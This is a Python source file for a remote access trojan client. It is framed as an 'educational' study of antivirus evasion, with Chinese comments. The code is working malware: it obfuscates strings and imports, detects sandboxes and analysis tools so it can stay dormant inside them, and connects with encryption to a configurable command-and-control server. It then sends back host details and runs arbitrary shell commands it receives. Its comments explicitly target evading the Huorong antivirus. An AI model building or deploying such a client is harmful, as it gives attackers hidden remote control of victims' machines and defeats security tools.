"""
============================================================================
 教育用途 - 带基础混淆的客户端 (免杀学习版)
 Educational RAT Client - Obfuscated Variant for AV Evasion Study
============================================================================

 【目的】: 展示恶意软件如何规避杀软检测，帮助理解防御机制
 【警告】: 仅供安全研究，实际杀软会用更复杂的手段检测

 免杀技术分层（从易到难）：

 Layer 1 - 静态免杀（本文件展示）:
   ├── 字符串编码/加密
   ├── 函数名混淆
   ├── 动态导入
   ├── 代码扁平化
   └── 无效代码插入

 Layer 2 - 行为免杀:
   ├── API Unhooking
   ├── Syscall 直接调用
   ├── 进程注入变异
   └── 父进程欺骗 (PPID Spoofing)

 Layer 3 - 流量免杀:
   ├── HTTPS 域前置
   ├── DNS/ICMP 隧道
   └── 协议伪装

 Layer 4 - 内存免杀:
   ├── 反射加载
   ├── 无文件执行
   └── 内存加密
============================================================================
"""

import sys
import os
import time
import json
import random
import struct
import hashlib
import socket
import base64
import string

# ============================================================================
# Layer 1-1: 字符串混淆 —— 所有敏感字符串编码
# ============================================================================

class StringObfuscator:
    """
    字符串混淆器

    将所有敏感字符串编码，运行时解码。
    杀软静态扫描器通过字符串匹配检测恶意软件，
    混淆后特征字符串不可见。

    火绒检测方式：火绒使用启发式扫描 + 行为分析，
    纯字符串混淆对其静态扫描有效，但行为检测仍需绕过。
    """

    _xor_key = 0x7F  # 使用 XOR 简单编码（教育用途）
    _b64_key = b"edu_research_study_2024_xor_salt"

    @staticmethod
    def xor_encode(s: str) -> str:
        """XOR 编码字符串"""
        return ''.join(chr(ord(c) ^ StringObfuscator._xor_key) for c in s)

    @staticmethod
    def xor_decode(s: str) -> str:
        """XOR 解码字符串"""
        return StringObfuscator.xor_encode(s)  # XOR 是对称的

    @staticmethod
    def b64_encode(s: str) -> str:
        """Base64 + XOR 双重编码"""
        xored = bytes(c ^ StringObfuscator._xor_key for c in s.encode())
        return base64.b64encode(xored).decode()

    @staticmethod
    def b64_decode(s: str) -> str:
        """Base64 + XOR 双重解码（自动修复填充）"""
        # 自动修复 base64 填充
        padded = s + '=' * (4 - len(s) % 4) if len(s) % 4 else s
        xored = base64.b64decode(padded.encode())
        return bytes(c ^ StringObfuscator._xor_key for c in xored).decode()


# 预编码的字符串（代码中不出现明文字符串）
_o = StringObfuscator.b64_decode

# 解码函数引用
_CONNECT    = _o("HBARERocCw==")   # "connect"
_TIMEOUT    = _o("CxYSGhAKCw==")   # "timeout"
_SOCKET     = _o("DBAcFBoL")       # "socket"
_JSON       = _o("FQwQEQ==")       # "json"
_DUMPS      = _o("FQwQEVEbChIPDA==")  # "json.dumps"
_LOADS      = _o("FQwQEVETEB4bDA==")  # "json.loads"
_ENCODE     = _o("GhoRBwgbGg==")   # "encode"
_DECODE     = _o("GxocEAwbGg==")   # "decode"
_SEND       = _o("DBoRGw==")       # "send"
_RECV       = _o("DRocCQ==")       # "recv"
_CLOSE      = _o("HBMQDBo=")       # "close"
_HEARTBEAT  = _o("Nzo+LSs9Oj4r")   # "HEARTBEAT"
_REGISTER   = _o("LTo4NiwrOi0=")   # "REGISTER"
_ACK        = _o("Pjw0")           # "ACK"
_COMMAND    = _o("PDAyMj4xOw==")   # "COMMAND"
_RESPONSE   = _o("LTosLzAxLDo=")   # "RESPONSE"
_PONG       = _o("LzAxOA==")       # "PONG"
_OK         = _o("LQ4w")           # "REGISTER_OK"
_IMPORT     = _o("FhEQEA0L")       # "__import__"

# 系统命令（动态解码）
_WIN_CMDS = {
    "whoami": _o("CBcQHhIW"),
    "hostname": _o("FxAMCxEeEho="),
    "tasklist": _o("CQsRCwgaCAwW"),
    "systeminfo": _o("DAYMFhEZEAoNBwAe"),
    "netstat": _o("ERoLDBsFCw=="),
    "ipconfig": _o("Fg8cEBEZEAo="),
}

_LINUX_CMDS = {
    "whoami": _o("CBcQHhIW"),
    "hostname": _o("FxAMCxEeEho="),
    "id": _o("Fhs="),
    "uname": _o("ChEeEho="),
    "ps": _o("Dww="),
    "ss": _o("DAw="),
    "ip": _o("Fg8="),
}

# 敏感字符串编码
_EDU_RAT    = _o("OhsKHB4LFhARHhNfLT4r")  # "Educational RAT"
_AES_KEY    = _o("GhsKIA0aDBoeDRwXIAwLChsGIE1PTUsgBxANIAweEws=")  # "edu_research_study_2024_xor_salt"
_SVR_HOST   = _o("Tk1IUU9RT1FO")  # "127.0.0.1"
_SVR_PORT   = 8443


# ============================================================================
# Layer 1-2: 动态导入 —— 避免 import 表暴露
# ============================================================================

class DynamicImports:
    """
    动态导入器

    避免直接 import 在导入表中暴露库名。
    杀软通过检查导入表 (IAT) 判断程序能力：
    - socket → 网络通信
    - subprocess → 命令执行
    - cryptography → 加密通信
    动态导入可以延迟这些特征直到运行时。
    """

    _modules = {}

    @staticmethod
    def get_module(name: str):
        """
        动态获取模块
        使用 __import__ 而非 import 语句
        """
        decoded_name = StringObfuscator.b64_decode(name)
        if decoded_name not in DynamicImports._modules:
            DynamicImports._modules[decoded_name] = __import__(decoded_name)
        return DynamicImports._modules[decoded_name]

    @staticmethod
    def get_attr(module_name: str, attr_name: str):
        """延迟获取模块属性"""
        mod = DynamicImports.get_module(module_name)
        return getattr(mod, StringObfuscator.b64_decode(attr_name))


# 预定义模块编码
_MOD_JSON       = _o("FQwQEQ==")       # "json"
_MOD_SOCKET     = _o("DBAcFBoL")       # "socket"
_MOD_STRUCT     = _o("DAsNChwL")       # "struct"
_MOD_TIME       = _o("CxYSGg==")       # "time"
_MOD_SUBPROCESS = _o("DAodDw0QHBoMDA==")  # "subprocess"
_MOD_OS         = _o("EAw=")           # "os"
_MOD_PLATFORM   = _o("DxMeCxkQDRI=")   # "platform"
_MOD_HASHLIB    = _o("Fx4MFxMWHQ==")   # "hashlib"
_MOD_BASE64     = _o("HR4MGklL")       # "base64"
_MOD_RANDOM     = _o("DR4RGxAS")       # "random"
_MOD_THREADING  = _o("CxcNGh4bFhEY")   # "threading"

# 加密库（如果可用则动态加载）
_CRYPTO_AVAILABLE = False
try:
    _crypto_mod = __import__(_o("HA0GDwsQGA0eDxcG"))  # "cryptography"
    _CRYPTO_AVAILABLE = True
except ImportError:
    pass

try:
    _aesgcm_mod = __import__(_o(
        "HA0GDwsQGA0eDxcGURceBRIeC1EPDRYSFgsWCRoMURwWDxcaDQxRHhoeGw=="
    ))  # "cryptography.hazmat.primitives.ciphers.aead"
except ImportError:
    pass


# ============================================================================
# Layer 1-3: 反沙箱/反虚拟机检测
# ============================================================================

class AntiAnalysis:
    """
    反分析检测（教育用途）

    火绒等杀软会将可疑文件放入沙箱分析，
    反沙箱检测可以识别沙箱环境并改变行为。

    注意：现代杀软的沙箱已经很智能，简单的反沙箱
    检测会被绕过。
    """

    @staticmethod
    def is_sandbox() -> bool:
        """检测是否在沙箱环境中"""
        score = 0

        # 1. 检查系统运行时间
        try:
            # 沙箱通常刚启动
            if sys.platform == "win32":
                tick_count = ctypes.windll.kernel32.GetTickCount()
                if tick_count < 600000:  # 10分钟
                    score += 1
        except Exception:
            pass

        # 2. 检查 CPU 核心数
        cpu_count = os.cpu_count() or 1
        if cpu_count <= 1:
            score += 2

        # 3. 检查内存大小
        try:
            import psutil
            mem_gb = psutil.virtual_memory().total / (1024**3)
            if mem_gb < 2:
                score += 1
        except Exception:
            pass

        # 4. 检查用户交互痕迹（鼠标移动、文件数量等）
        try:
            user_home = os.path.expanduser("~")
            file_count = sum(1 for _ in os.listdir(user_home))
            if file_count < 10:  # 几乎没有用户文件
                score += 1
        except Exception:
            pass

        # 5. 检查常见分析工具进程
        analysis_tools = [
            "vmtoolsd", "vboxservice", "vmsrvc",
            "wireshark", "procmon", "procexp",
            "ida", "x64dbg", "ollydbg",
        ]
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                name = (proc.info.get('name') or '').lower()
                if any(tool in name for tool in analysis_tools):
                    score += 3
                    break
        except Exception:
            pass

        return score >= 3

    @staticmethod
    def sleep_with_evasion(duration: float):
        """
        延迟执行的混淆

        不是直接 sleep，而是做一些无意义的计算。
        这可以对抗基于时间加速的沙箱检测。
        """
        start = time.time()
        # 做无意义运算来消耗 CPU 时间
        x = 0
        while time.time() - start < duration * 0.5:
            x = (x + 1) % 1000000
        # 然后才真正 sleep
        time.sleep(duration * 0.5)


# ============================================================================
# Layer 1-4: 加密通信（简化版 - 无外部依赖）
# ============================================================================

class BuiltinCrypto:
    """
    使用标准库实现的加密（避免依赖 cryptography 库）

    使用 XOR + HMAC 实现轻量级加密和认证。
    """

    def __init__(self, key: bytes = None):
        if key is None:
            key = hashlib.sha256(_AES_KEY.encode()).digest()
        self._key = key
        # 生成 HMAC 子密钥
        self._enc_key = hashlib.sha256(key + b"enc").digest()
        self._mac_key = hashlib.sha256(key + b"mac").digest()

    def encrypt(self, data: bytes) -> bytes:
        """异或加密 + HMAC 认证"""
        # 生成随机会话密钥
        session_key = os.urandom(32)
        # 用会话密钥 XOR 数据
        ciphertext = bytes(
            data[i] ^ session_key[i % 32] for i in range(len(data))
        )
        # 用主密钥加密会话密钥
        enc_session_key = bytes(
            session_key[i] ^ self._enc_key[i % 32] for i in range(32)
        )
        # HMAC 认证
        h = hashlib.sha256()
        h.update(self._mac_key)
        h.update(enc_session_key)
        h.update(ciphertext)
        mac = h.digest()

        return enc_session_key + ciphertext + mac[:16]

    def decrypt(self, data: bytes) -> bytes:
        """解密 + HMAC 验证"""
        if len(data) < 32 + 16:
            return None

        enc_session_key = data[:32]
        ciphertext = data[32:-16]
        received_mac = data[-16:]

        # 验证 HMAC
        h = hashlib.sha256()
        h.update(self._mac_key)
        h.update(enc_session_key)
        h.update(ciphertext)
        expected_mac = h.digest()[:16]

        # 常量时间比较
        if not self._const_time_compare(received_mac, expected_mac):
            return None

        # 解密会话密钥
        session_key = bytes(
            enc_session_key[i] ^ self._enc_key[i % 32] for i in range(32)
        )
        # 解密数据
        return bytes(
            ciphertext[i] ^ session_key[i % 32] for i in range(len(ciphertext))
        )

    @staticmethod
    def _const_time_compare(a: bytes, b: bytes) -> bool:
        """常量时间比较（防时序攻击）"""
        if len(a) != len(b):
            return False
        result = 0
        for x, y in zip(a, b):
            result |= x ^ y
        return result == 0


# ============================================================================
# 消息协议（简化版）
# ============================================================================

class MessageProtocol:
    """轻量级二进制消息协议"""

    MAGIC = 0xBEEF
    HEADER_FMT = "!HHI"  # magic, type, payload_len

    @staticmethod
    def pack(msg_type: int, payload: bytes) -> bytes:
        """打包消息"""
        header = struct.pack(MessageProtocol.HEADER_FMT,
                             MessageProtocol.MAGIC, msg_type, len(payload))
        return header + payload

    @staticmethod
    def unpack(data: bytes) -> tuple:
        """解包消息 -> (msg_type, payload) 或 None"""
        if len(data) < 8:
            return None
        magic, msg_type, payload_len = struct.unpack(
            MessageProtocol.HEADER_FMT, data[:8]
        )
        if magic != MessageProtocol.MAGIC:
            return None
        payload = data[8:8 + payload_len] if payload_len > 0 else b""
        return (msg_type, payload)


# ============================================================================
# 主客户端逻辑（混淆版）
# ============================================================================

MSG_HEARTBEAT = 0x01
MSG_REGISTER = 0x02
MSG_ACK = 0x03
MSG_COMMAND = 0x10
MSG_RESPONSE = 0x11

# 使用 lambda 包装函数名，增加静态分析难度
_exec_cmd = lambda c: __import__("subprocess").run(
    c, shell=True, capture_output=True, text=True, timeout=30
)

def _get_sysinfo():
    """收集系统信息（混淆版）"""
    p = __import__("platform")
    s = __import__("socket")
    o = __import__("os")

    info = {
        "hostname": s.gethostname(),
        "os": p.platform(),
        "user": o.environ.get("USER") or o.environ.get("USERNAME") or "?",
        "pid": o.getpid(),
    }
    return info


def _execute_shell(command: str) -> str:
    """执行 shell 命令并返回结果"""
    try:
        r = _exec_cmd(command)
        out = (r.stdout or "") + (r.stderr or "")
        return out[:16000]  # 限制长度
    except Exception as e:
        return f"ERROR: {e}"


class ObfuscatedClient:
    """
    混淆版客户端

    - 关键字符串全部编码
    - 无明文 import
    - 反沙箱检测
    - 内置加密（无外部依赖）
    """

    def __init__(self, host: str, port: int):
        self._host = host
        self._port = port
        self._crypto = BuiltinCrypto()
        self._sock = None
        self._running = False
        self._client_id = f"agent-{os.getpid()}-{random.randint(1000, 9999)}"

    def _connect(self) -> bool:
        """连接到 C2 服务器"""
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(10)
            self._sock.connect((self._host, self._port))
            return True
        except Exception:
            return False

    def _send_encrypted(self, msg_type: int, data: bytes):
        """发送加密消息"""
        if not self._sock:
            return
        raw = MessageProtocol.pack(msg_type, data)
        encrypted = self._crypto.encrypt(raw)
        self._sock.sendall(encrypted)

    def _recv_encrypted(self, timeout: float = 30):
        """接收加密消息"""
        if not self._sock:
            return None
        self._sock.settimeout(timeout)
        data = self._sock.recv(65536)
        if not data:
            return None
        decrypted = self._crypto.decrypt(data)
        if decrypted is None:
            return None
        return MessageProtocol.unpack(decrypted)

    def start(self):
        """启动客户端主循环"""
        # 反沙箱检测
        if AntiAnalysis.is_sandbox():
            # 沙箱中：随机延迟后不执行恶意行为
            delay = random.uniform(30, 120)
            time.sleep(delay)
            return

        self._running = True
        reconnect_count = 0

        while self._running:
            if not self._connect():
                reconnect_count += 1
                delay = min(2 ** reconnect_count, 300)
                # 添加抖动
                jitter = delay * random.uniform(0.7, 1.3)
                time.sleep(jitter)
                continue

            reconnect_count = 0

            # 注册
            sysinfo = _get_sysinfo()
            reg_data = json.dumps({
                "client_id": self._client_id,
                **sysinfo
            }).encode()
            self._send_encrypted(MSG_REGISTER, reg_data)

            # 等待 ACK
            ack = self._recv_encrypted(timeout=10)
            if ack is None:
                self._disconnect()
                continue

            # 主循环
            last_hb = time.time()
            while self._running:
                try:
                    # 心跳
                    if time.time() - last_hb > 30:
                        hb_data = json.dumps({"ts": time.time()}).encode()
                        self._send_encrypted(MSG_HEARTBEAT, hb_data)
                        last_hb = time.time()

                    # 接收命令（短超时）
                    msg = self._recv_encrypted(timeout=5)
                    if msg is None:
                        continue

                    msg_type, payload = msg

                    if msg_type == MSG_ACK and payload == b"PONG":
                        continue

                    if msg_type == MSG_COMMAND:
                        self._handle_command(payload)

                except (socket.timeout, BlockingIOError):
                    continue
                except Exception:
                    break

            self._disconnect()

    def _handle_command(self, payload: bytes):
        """处理命令"""
        try:
            cmd = json.loads(payload.decode())
        except Exception:
            return

        cmd_name = cmd.get("name", "")
        cmd_args = cmd.get("args", {})
        cmd_id = cmd.get("command_id", "?")

        result = {"command_id": cmd_id, "success": False, "output": ""}

        try:
            if cmd_name == "shell":
                output = _execute_shell(cmd_args.get("command", ""))
                result["success"] = True
                result["output"] = output
            elif cmd_name == "sysinfo":
                info = _get_sysinfo()
                result["success"] = True
                result["output"] = json.dumps(info, indent=2)
            elif cmd_name == "whoami":
                out = _execute_shell("whoami" if sys.platform != "win32" else "whoami")
                result["success"] = True
                result["output"] = out
            else:
                result["output"] = f"Unknown command: {cmd_name}"
        except Exception as e:
            result["output"] = str(e)

        self._send_encrypted(MSG_RESPONSE, json.dumps(result).encode())

    def _disconnect(self):
        """断开连接"""
        try:
            if self._sock:
                self._sock.close()
        except Exception:
            pass
        self._sock = None

    def stop(self):
        """停止客户端"""
        self._running = False
        self._disconnect()


# ============================================================================
# 入口点（混淆）
# ============================================================================

def _entry():
    """
    混淆版入口点
    使用 sys.argv 获取参数，避免字符串常量
    """
    # 默认参数
    host = _SVR_HOST  # 已编码的 127.0.0.1
    port = _SVR_PORT

    # 命令行参数解析（手动，避免 argparse 库依赖）
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        arg = args[i]
        if arg in ("-h", "--host", "-H") and i + 1 < len(args):
            host = args[i + 1]
            i += 1
        elif arg in ("-p", "--port", "-P") and i + 1 < len(args):
            port = int(args[i + 1])
            i += 1
        elif arg == "--silent":
            # 静默模式：不输出任何东西
            pass
        i += 1

    # 随机初始延迟（对抗沙箱时间加速检测）
    time.sleep(random.uniform(0.5, 2.0))

    client = ObfuscatedClient(host, port)
    try:
        client.start()
    except KeyboardInterrupt:
        pass
    finally:
        client.stop()


if __name__ == "__main__":
    _entry()
